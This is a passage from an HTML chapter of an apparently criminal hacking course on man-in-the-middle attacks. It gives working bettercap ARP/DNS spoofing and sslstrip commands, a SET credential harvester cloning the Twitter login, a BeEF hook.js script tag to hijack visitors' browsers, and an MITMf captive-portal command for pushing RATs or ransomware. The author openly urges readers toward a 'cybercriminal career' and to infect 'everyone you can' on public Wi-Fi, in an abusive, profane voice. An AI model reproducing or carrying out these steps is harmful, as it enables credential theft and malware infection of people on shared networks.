+      <br/>
+      set arp.spoof.targets TARGET_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     <b>
+      set dns.spoof.domains *
+      <br/>
+      set dns.spoof.address ATTACKER_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set dns.spoof.address 192.168.2.233
+    <br/>
+    <font color="red">
+     <b>
+      set dns.spoof.all true
+      <br/>
+      net.sniff on
+      <br/>
+      http.proxy on
+      <br/>
+      arp.spoof on
+      <br/>
+      dns.spoof on
+      <br/>
+     </b>
+    </font>
+    <br/>
+    On the target computer open up your web browser with a "New Private Window" and try to visit:
+    <br/>
+    http://login.ebiquity.com
+    <br/>
+    <br/>
+    You'll notice the target computer is redirected to the apache2 default webpage hosted on your machine instead of visiting the intended webpage. If you do not see the image below on your target computer you fucked up somehow and didn't follow along exactly as described. Remember, you want to open a "New Private Window" so you're not seeing a cache version of http://login.ebiquity.com. I cannot stress enough if you're having issues do not use Kali in a VM but instead boot from USB or use Kali as your main OS.
+    <br/>
+    <center>
+     <img height="450" src="../images2/41.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    <div id="HTTPS">
+    </div>
+    <h4>
+     <font color="blue">
+      Re-directing
+      <u>
+       HTTPS
+      </u>
+      requests to your webserver over the network with Bettercap
+     </font>
+    </h4>
+    In this attack we're going to MITM a target so that when they try and visit a HTTPS website they are re-directed to our web server.
+    <br/>
+    <br/>
+    My attacker computer IP is 192.168.2.233
+    <br/>
+    My example target computer IP is 192.168.2.100
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo service apache2 restart
+      <br/>
+      sudo bettercap
+     </b>
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe on
+     </b>
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe off
+      <br/>
+      net.show
+      <br/>
+     </b>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     <b>
+      set https.proxy.sslstrip true
+      <br/>
+      set net.sniff.verbose false
+      <br/>
+      set arp.spoof.targets TARGET_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     <b>
+      set dns.spoof.domains *
+      <br/>
+      set dns.spoof.address ATTACKER_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set dns.spoof.address 192.168.2.233
+    <br/>
+    <font color="red">
+     <b>
+      set dns.spoof.all true
+      <br/>
+      net.sniff on
+      <br/>
+      https.proxy on
+      <br/>
+      arp.spoof on
+      <br/>
+      dns.spoof on
+      <br/>
+     </b>
+    </font>
+    <br/>
+    Common problems that people encounter here are not entering "https.proxy.sslstrip" and "https.proxy on" commands. Remember the "https" and ensure you're not entering "http".
+    <br/>
+    <br/>
+    On your target computer open a web browser with a "New Private Window" and visit:
+    <br/>
+    https://senglehardt.com/demo/no_boundaries/loginmanager
+    <br/>
+    <br/>
+    Depending on which browser you're using will dictate the HTTPS error displayed to you. As discussed in the previous chapter these are the warnings that users are presented with when a MITM attack is happening against them. Go ahead and click "Advanced" or similar to click through the warnings and visit https://senglehardt.com/demo/no_boundaries/loginmanager. Once you've clicked through the warning you should be re-directed to the Apache2 default webpage.
+    <br/>
+    <br/>
+    Again, this doesn't really do too much from a malicious standpoint and you're not trying to re-direct them to a web login portal of some sort to phish their credentials because we know that's probably going to be doubtful. Not impossible per se but still. That's also not going to happen if there is HSTS enabled right? RIGHT?! You could still re-direct a non-HSTS website to your landing page phishing or otherwise though but waiting for them to login can take time and we're impatient. Let's just get to the point and infect them accordingly so we can get high and use their computer we've just infected at a later time.
+    <br/>
+    <br/>
+    As you've already learned they would have to visit that webpage for the first time over HTTPS, the website cannot have HSTS enabled, they would need to click through all the warnings, and then enter their credentials. Chance of this happening? Not very useful for us random attackers looking to compromise these people, right?! Let's keep going comrades.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Social Engineering Toolkit (SET)
+     </font>
+    </h3>
+    Now we're going to talk briefly about SET. This is more phishing related and will be the only portion related to phishing in this course as there's a whole guide for this coming up. This tool was developed in a way to launch advanced social engineering (SE) attacks against individuals on the same network as you or across the internet. I'm not going to go into major details on what SET is and why it's a good tool to leverage because I expect you to do some research on SET yourself. In this course, I'll teach you the syntax and how to launch these attacks properly.
+    <br/>
+    <br/>
+    For our purpose we're going to perform a MITM attack and re-direct people to our phishing pages for the purpose of tricking users into entering their credentials so we're able to capture them. We're going to use SET to accomplish this. Once we have the victims credentials we can then login to their account to do whatever you wish.
+    <br/>
+    <br/>
+    Our first step is to perform a MITM attack re-directing everyone to our webserver. You've already learned how to do this with bettercap so let's revisit the syntax needed to do so first.
+    <br/>
+    <br/>
+    <a href="#HTTP">
+     Click here
+    </a>
+    or scroll up to the "Re-directing HTTP requests to your webserver over the network with Bettercap" portion and enter all of that syntax again. Once you've entered the syntax with bettercap we'll then use SET to phish some shit.
+    <br/>
+    <br/>
+    Keep your bettercap window open and running once you've completed the syntax for "Re-directing HTTP requests to your webserver over the network with Bettercap". Next, we launch SET.
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo service apache2 stop
+      <br/>
+      sudo setoolkit
+      <br/>
+     </b>
+    </font>
+    <br/>
+    You'll be presented with the main menu as seen below.
+    <center>
+     <img height="550" src="../images2/47.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    Enter the number (1) and hit ENTER on your keyboard for "Social Engineering Attacks". Another menu will come up as seen below.
+    <br/>
+    <center>
+     <img height="550" src="../images2/48.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    Enter the number (2) and hit ENTER on your keyboard for the "Website Attack Vectors" and you'll be presented with the menu below.
+    <br/>
+    <center>
+     <img height="175" src="../images2/50.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    Next, enter the number (3) and hit ENTER on your keyboard for the "Credential Harvester Attack Method".
+    <br/>
+    <center>
+     <img height="400" src="../images2/49.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    We're going to select the Web Templates option and use the Twitter template for the example I'm using. If you wanted to clone a specific website then you of course could do that as well but for now we'll stick with the templates in SET.
+    <br/>
+    <br/>
+    Select (1) and hit ENTER on your keyboard. SET will ask you for the IP of your Kali machine. It should automatically show your IP so just hit ENTER on your keyboard. We're going to select the Twitter template so enter the number (3) and hit ENTER on your keyboard. SET will move all the appropriate files into your webserver directory (/var/www/html) for you so I'll you need to do is hit ENTER on your keyboard.
+    <br/>
+    <center>
+     <img height="450" src="../images2/51.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    SET has cloned the Twitter login page and is hosting the phishing pages on your webserver on Kali. It's important to note that the templates used in SET will not re-direct people after they've entered their credentials to the webpage that they're expecting to see. You might want to consider editing "/etc/setoolkit/set.config" as it tells you in the above screenshot to do so if you wanted it to look more less suspicious. Now that our attack is running you just need to wait for people to be re-directed to your webserver and enter their credentials which will be displayed to you within the SET window.
+    <br/>
+    <br/>
+    The example I've used here is we're re-directing all HTTP requests to our Twitter phishing page. Obviously if we're just re-directing everyone to one page it's doubtful people are just gonna randomly enter their shit for you. This is why it's important to tailor your attacks to the individuals you're trying to attack. A good example would be to re-direct everyone to your attack landing page with SET running that appears to be a sign-in form to get internet access and include a FB login page or something similar. Creativity is important for success.
+    <br/>
+    <br/>
+    On your target machine try to visit any HTTP website and you'll be re-directed to your Twitter phishing page. You should have setup bettercap accordingly as just running "setoolkit" without setting up anything MITM related will not MITM your targets.
+    <br/>
+    <br/>
+    If you're trying to intercept HTTPS traffic that is non-HSTS then
+    <a href="#HTTPS">
+     <b>
+      click here
+     </b>
+    </a>
+    or please scroll up to "Re-directing HTTPS requests to your webserver over the network with Bettercap" and follow that syntax before following the SET syntax here.
+    <br/>
+    <br/>
+    SET is a great tool to be utilized accordingly so you should take some time into researching other attack vectors with SET.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      The Browser Exploitation Framework Project (BeEF)
+     </font>
+    </h3>
+    <font color="blue">
+     <b>
+      https://beefproject.com
+      <br/>
+      <br/>
+     </b>
+    </font>
+    "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
+Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context."
+    <br/>
+    <br/>
+    In a nutshell we use BeEF to embed some JavaScript (JS) in our/a website that allows us to control the web browsers of the people that visit our specific website. For example, you're performing a MITM attack on the Wi-Fi network re-directing everyone to your attack landing page and since it's YOUR attack landing page you can obviously add the JS required into the HTML code. This way when those fuck faces get re-directed to your attack landing page you have another attack vector to use. You feel me?
+    <br/>
+    <br/>
+    I hope that some people reading this have heard about BeEF and this is a refresher but I'll give a brief explanation about what BeEF is so hopefully this helps the newbies out there. Some people just don't understand what BeEF is, get confused, or think it's too complicated to use. It's not. It's a great tool to add to your cyber weapon arsenal specially if you've compromised a website and can alter the HTML code to slip this in. Depending on goals you know. Anyways, in general, BeEF enables you to "hook" users web browsers when they visit a webpage that you've added the BeEF Javascript (JS) to. Just like any other webpage on the internet that has Javascript in it when you visit the website it will execute and do exactly what it was coded to do. BeEF uses Javascript to "hook" peoples web browsers which allows you a
+    <u>
+     little
+    </u>
+    control over what's happening to the victims web browsers and what's displayed to them. Another reason to disable JS when using the Tor browser which you would have learned from Act 0!
+    <br/>
+    <br/>
+    Each website is coded in a different way yes? Each web page responds differently, might display popups, flash different colors, open an infinite amount of new pop-up windows with dick pics (classic back in the day), visually appear differently, or do whatever it's coded to do right? Web browsers display the webpage content to you and are coded to work with your browser. Just consider BeEF as a website feature working with your browser as well.
+    <br/>
+    <br/>
+    If you're full blown retarded just visualize a fish hook. Now picture a fish hook hanging off of a web page and when people visit it they're "hooked", like a fish, but once they leave that webpage or close their browser you lose the "hook". OK? Got it? Alright?
+    <br/>
+    <br/>
+    What I've learned from using this tool is that you want to spend some time when creating your attack landing pages and make them like realistic webpages for whatever hacker campaign you plan on launching. You should see how we keep coming back to making sure your attack landing pages are legit looking. What I do is I create a full webpage with multiple pages, relevant content, and I make sure it has lengthy content for users to read and spend time on. This is very important when using BeEF because you want the people that are re-directed to your attack landing page to stay on your attack landing page for as
+    <u>
+     long as possible
+    </u>
+    while you have them "hooked" with BeEF. The reason for this is once they close their web browser or visit another website away from your attack landing page you will lose the BeEF hook and lose control over their browser. Right? Since they left our attack page and obviously no JS BeEF hook in the other webpages they're browsing so you lose the hook. Which is annoying. This is why you want them to stay on your attack landing page for as long as possible in order to maximize this tool.
+    <br/>
+    <br/>
+    <font color="blue">
+     <b>
+      Once you re-direct people to your website with the BeEF hook embedded in it the victims browser is hooked but once they leave your website or close the browser you will lose the connection. BeEF is only useful when they stay on the webpage that you've embed the BeEF hook into. Important to remember.
+      <br/>
+      <br/>
+     </b>
+    </font>
+    Again, the more realistic looking the webpage you're re-directing them to the better and the more content the victims have to read/go through the longer they will spend time on that webpage. This is ideal for using this tool.
+    <br/>
+    <br/>
+    Let's setup and launch BeEF to see how it functions, how victims are "hooked", and what we're able to accomplish with this tool. This example is acceptable to be running Kali in VM if you choose. Any problems direct boot from USB for the love of fuck!
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      git clone https://github.com/beefproject/beef.git
+      <br/>
+      cd beef
+      <br/>
+      sudo ./install
+      <br/>
+     </b>
+    </font>
+    Once the install is finished then:
+    <br/>
+    <font color="red">
+     <b>
+      sudo ./update-beef
+     </b>
+    </font>
+    <br/>
+    <br/>
+    We need to change the default credentials or BeEF won't run
+    <br/>
+    <font color="red">
+     <b>
+      sudo gedit config.yaml
+     </b>
+    </font>
+    <br/>
+    <center>
+     <img height="450" src="../images2/52.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    Change "user" and "passwd" to "TEST" on line 20 and 21, then save the file, and close it to follow along.
+    <br/>
+    <br/>
+    <center>
+     <img height="50" src="../images2/53.png" width="200"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      cd beef
+      <br/>
+      sudo ./beef
+      <br/>
+     </b>
+    </font>
+    <br/>
+    <br/>
+    Once BeEF finishes loading you'll be presented with the BeEF control panel information. Plug "http://127.0.0.1:3000/ui/panel" into your web browser and hit enter. Once at the login screen enter "TEST" for the username and password (or whatever you decided to change it to). You'll be greeted with the BeEF web control panel for the victims that you hook with BeEF.
+    <br/>
+    <center>
+     <img height="425" src="../images2/54.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    You'll notice Offline/Online browsers on the left hand side of the screenshot above. This is where the IPs are displayed to you when you hook someone.
+    <br/>
+    <br/>
+    When you ran ./beef and before you loaded your browser you would've seen this below.
+    <center>
+     <img height="425" src="../images2/55.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    "http://192.168.2.191:3000/hook.js" in my screenshot above is the BeEF hook that is needed to add to my attack landing page HTML source code. If you were running BeEF from a VPS you would need to replace your localhost IP (127.0.0.1) with that of your VPS IP where BeEF is waiting. Obviously.
+    <br/>
+    <br/>
+    All I would need to add into the HTML code of my website for BeEF to "hook" people is:
+    <br/>
+    <font color="orange">
+     <b>
+      &lt;script src="http://192.168.2.191/hook.js" type="text/javascript"&gt;&lt;/script&gt;
+     </b>
+    </font>
+    <br/>
+    <br/>
+    You're remote Javascript(JS) is executed in the victim's browser when they land on your attack page. Pretty simple but the backend of BeEF is where the magic happens. If you want more of a detailed explanation of what BeEF is then it's time to Google and research the tool on your own. For now we're moving on.
+    <br/>
+    <br/>
+    You should leave BeEF running and be logged into the BeEF web control panel moving forward. Remember to replace my examples with the IP of your Kali machine.
+    <br/>
+    <br/>
+    My attacker computer IP is 192.168.2.191
+    <br/>
+    My victim who was re-directed to my attack landing page IP is 192.168.2.193
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo service apache2 restart
+      <br/>
+      sudo gedit /var/www/html/index.html
+      <br/>
+     </b>
+    </font>
+    Enter the following into index.html, save it and close it.
+    <br/>
+    <font color="red">
+     <b>
+      "HELLO!"
+      <br/>
+      &lt;script src="http://192.168.2.191:3000/hook.js" type="text/javascript"&gt;&lt;/script&gt;
+     </b>
+    </font>
+    <br/>
+    <br/>
+    All the above syntax does is launch your web server, creates a webpage with "HELLO" and embeds the BeEF JS hook into the HTML file index.html. When you visit your website with a normal web browser at http://192.168.2.191 from your target machine you'll notice in your BeEF web control panel a victim. Sometimes there are minor delays for the victim to display so be a little patient depending on the connection, browser, etc. Once you see your target machine IP click on it and then the "Commands" tab and it'll look the screenshot below.
+    <center>
+     <img height="500" src="../images2/56.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    Here we can see what we're able to do to our victims once they're hooked. For this example click on the "Social Engineering" folder and then click on "Google Phishing". You'll be presented with the screenshot below.
+    <center>
+     <img height="500" src="../images2/57.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    When you click on "Execute" in the bottom right of the screen you'll notice nothing happens but in the middle column you should now have a command there. Clicking on the command will reveal nothing but if the victim is tricked into entering their credentials it will be revealed here.
+    <br/>
+    <center>
+     <img height="500" src="../images2/58.png" width="400"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    The next thing in relation to BeEF is maintaining persistence. As long as the victim is on your webpage with the BeEF hook embedded in it you will maintain your BeEF hook in them. The victims can navigate the webpage like normal and we still have a foothold into them despite them leaving the initial webpage. This is why I create my attack landing page in a way to keep them on my webpage for as long as possible. The longer they're on my rabbit hole webpage the more time I have in determining my next course of action whether that be phishing, pushing malware, or otherwise. As you can imagine these attacks happen quickly so as soon as you've hooked someone get ready to execute whatever attack you're planning on doing in real time. Yes you're sitting there launching these attacks manually in real time. So grab a coffee and get the fuck ready.
+    <br/>
+    <br/>
+    Click on the "Persistence" Folder, then click on the "Man In the Browser" tab and click Execute. You'll notice a Command in the middle column now which you're able to click on for more details. Once you've done this as long as the victim stays on your IP and is browsing through your rabbit hole attack landing page you'll maintain the hook which gives you more time to launch XYZ attack.
+    <br/>
+    <br/>
+    Be mindful that some attacks require more knowledge of this tool to function correctly so I highly suggest taking the time to go through BeEF "config.yaml" file and test this tool to your liking before using it in the wild.
+    <br/>
+    <br/>
+    That's about as far as I'm going to go into BeEF but there's plenty of other things you can do with this tool. Take the time to test it and see the functionality of it and determine if this might be a good attack vector to be successful in your goals.
+    <br/>
+    <br/>
+    Also, I'm sure you're like me which means you don't like to be waiting for a victim to be hooked with BeEF and then manually doing anything. I want shit automated so I don't have to pay attention to what's happening. If you care to use this tool then you should educate yourself on the Autorun function within BeEF so things are automated like a boss.
+    <br/>
+    https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Man-In-The-Middle Framework (MITMf)
+     </font>
+    </h3>
+    This tool is specifically meant for targeting people on the network who have FireFox installed as their main default browser. We target FireFox specifically because it displays a certain notification to the victims which we can leverage. When you connect to a coffee shop Wi-Fi, such as Starbucks, usually you're presented with a "Click to Connect" type screen. Some web browsers will display the login page automatically whereas some require you to click somewhere to get internet connectivity. Each web browser reacts differently when connected to these types of networks but FireFox users are displayed a notification which they have to click manually to get through. We'll utilize that feature against the people who use FireFox.
+    <br/>
+    <br/>
+    As you progress in your cybercriminal career you should be thinking from a social engineer's perspective. This goes for all hacking these days really. Yes of course you need the technical skills but you also require social engineering mindsets. Most of the tools and techniques we're talking about are against the users themselves. Tailor your attacks, spend effort on creating them, and plan for the best chance of success.
+    <br/>
+    <br/>
+    Here's an example of one of my methods to determine FireFox users. I MITM everything and force everyone on the network to my attack landing page. I launch my attack very briefly just to get a little idea of who's on the network and then stop it allowing them to have internet again. Lastly, I check my web server logs checking their User-Agent string to determine which IP has what browser and attack accordingly. Yes, you should understand? Focus your efforts for the best chance of success. If you do half ass attacks expect half-ass results. Get your RAT, ransomware, whatever the fuck and get it done right.
+    <br/>
+    <br/>
+    For this tool we're going to use the Man-In-The-Middle Framework, also known as
+    <b>
+     MITMf
+    </b>
+    .
+    <br/>
+    <br/>
+    Let's install everything we need onto our Kali machine. This wasn't done in the pre-requisites so do this now. I recommend doing a fresh Kali install when following through these examples each time in case you did something crazy to your install and to ensure we're all on the same page. Like I've said before if you're not having positive results or you're having problems boot directly from USB or use Kali as your main OS.
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      git clone https://github.com/byt3bl33d3r/MITMf.git
+      <br/>
+      cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update --recursive
+      <br/>
+      pip install -r requirements.txt
+      <br/>
+      sudo cp ~/MITMf/config/captive/portal.html /var/www/html/index.html
+     </b>
+    </font>
+    <br/>
+    This will copy the captive portal login from MITMf to our web server directory.
+    <br/>
+    <br/>
+    Ok now that we have it setup we want to create a captive login portal that will prompt users to install a file to deliver our malware accordingly. MITMf is an excellent tool and I highly suggest tinkering around with it when you're able to but for now let's keep focused.
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo python ~/MITMf/mitmf.py --hsts --arp --spoof --dns --gateway ROUTER_IP --target TARGET_IP --captive --portaldir /var/www/html -i INTERFACE
+     </b>
+    </font>
+    <br/>
+    <br/>
+    My example:
+    <br/>
+    My interface is wlan0, my target computer IP is 192.168.2.100, and my router IP is 192.168.2.1.
+    <br/>
+    <br/>
+    <font color="red">
+     <b>
+      sudo python ~/MITMf/mitmf.py --hsts --arp --spoof --dns --gateway 192.168.2.1 --target 192.168.2.100 --captive --portaldir /var/www/html -i wlan0
+     </b>
+    </font>
+    <br/>
+    <br/>
+    Once that command is running open FireFox on the target computer. If you use FireFox than you should be familiar with the prompt below when on an open Wi-Fi such as Starbucks, etc.
+    <br/>
+    <center>
+     <img height="300" src="../images2/40.png" width="700"/>
+     <br/>
+    </center>
+    If "Open Network Login Page" is clicked they'll be re-directed to the website you created in /var/www/html. Since we copied ~/MITMf/confog/captive/portal.html to /var/www/html/index.html the screenshot below is what is displayed to the victim when re-directed to your web server.
+    <br/>
+    <br/>
+    You'll notice they can click on the hyperlink "Captive Portal Client" which is setup to download "CaptiveClient.exe" or any executable over the network which could be your RAT, ransomware, etc.
+    <center>
+     <img height="400" src="../images2/42.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    The point of this MITM guide is why fuck around? I advise infecting everyone you can when you're on the same network as others changing locations as much as possible.
+    <br/>
+    <br/>
+    There is a problem with the above attack though. Since we're re-directing
+    <u>
+     all
+    </u>
+    HTTP web requests to our web server that means even if a victim is re-directed to your custom webpage and clicks on the link to download a file over HTTP they would be unable to. Since we're re-directing all HTTP requests the HTTP request for the file would be intercepted and redirected back to the same webpage. This makes sense yes? The request for the file is over HTTP so they're unable to download the file without getting redirected. Problems for us...
+    <br/>
+    <br/>
+    Also, most browsers have their URL bar directly linked to Google, Yahoo, Bing, etc. which are all HTTPS/HSTS websites and it's highly unlikely people surf to a HTTP website in order to get redirected with your attacks. Times have changed and it's to be assumed HTTPS is the norm now. You can sit on the network as long as you'd like and wait for someone to visit a HTTP website if you'd like but we're not a patient bunch are we. In the following chapter we'll discuss a technique when it comes to compromising individuals on a network with malware, ransomware, etc. and getting around HTTPS circle jerk bullshit.
+    <br/>
+    <br/>
+    This chapter was long and contained a lot of information so ensure you're testing all the examples to get a feel for how it all works before unleashing this onto the masses.
+    <br/>
+    <br/>
+    <font color="blue">
+     <b>
+      Things you've learned in this chapter:
+     </b>
+     <br/>
+     <li>
+      How to MITM network traffic to sniff for HTTP credentials.
+     </li>
+     <li>
+      How to MITM network traffic to sniff for HTTPS credentials.
+     </li>
+     <li>
+      How to MITM HTTP network traffic in order to re-direct users to your webserver.
+     </li>
+     <li>
+      How to MITM HTTPS network traffic in order to re-direct users to your webserver.
+     </li>
+     <li>
+      How to use the Social Engineering Toolkit (SET).
+     </li>
+     <li>
+      How to use BeEF to hook web browsers of our victims.
+     </li>
+    </font>
+    <br/>
+    <br/>
+    <b>
+     <center>
+      <a class="button" href="Chapter-11.html" style="text-decoration:none">
+       Click to continue to Chapter 11
+      </a>
+     </center>
+    </b>
+    <div id="side">
+     <div class="boxtop">
+     </div>
+     <div class="box">
+      <center>
+       <span class="item">
+        <strong>
+         HackTown
+        </strong>
+        <br>
+         Hacking Courses
+        </br>
+       </span>
+      </center>
+     </div>
+     <div class="box">
+      <a href="Chapter-1.html">
+       <span class="item">
+        <strong>
+         Chapter 1
+        </strong>
+        <br>
+         Introduction
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-2.html">
+       <span class="item">
+        <strong>
+         Chapter 2
+        </strong>
+        <br>
+         Pre-requisites
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-3.html">
+       <span class="item">
+        <strong>
+         Chapter 3
+        </strong>
+        <br>
+         Private IPs
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-4.html">
+       <span class="item">
+        <strong>
+         Chapter 4
+        </strong>
+        <br>
+         Router admin interface
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-5.html">
+       <span class="item">
+        <strong>
+         Chapter 5
+        </strong>
+        <br>
+         Searching for targets
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-6.html">
+       <span class="item">
+        <strong>
+         Chapter 6
+        </strong>
+        <br>
+         Router exploitation
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-7.html">
+       <span class="item">
+        <strong>
+         Chapter 7
+        </strong>
+        <br>
+         Printer exploitation
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-8.html">
+       <span class="item">
+        <strong>
+         Chapter 8
+        </strong>
+        <br>
+         Brute forcing the router interface
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-9.html">
+       <span class="item">
+        <strong>
+         Chapter 9
+        </strong>
+        <br>
+         Getting up to date
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-10.html">
+       <span class="item">
+        <strong>
+         Chapter 10
+        </strong>
+        <br>
+         Who's DAT Man-In-The-Middle(MITM)
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-11.html">
+       <span class="item">
+        <strong>
+         Chapter 11
+        </strong>
+        <br>
+         One method to rule them all
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Conclusion.html">
+       <span class="item">
+        <strong>
+         Conclusion
+        </strong>
+        <br>
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="boxbottom">
+     </div>
+    </div>
+    <p id="ad">
+    </p>
+   </div>
+  </div>
+ </div>
+</body>
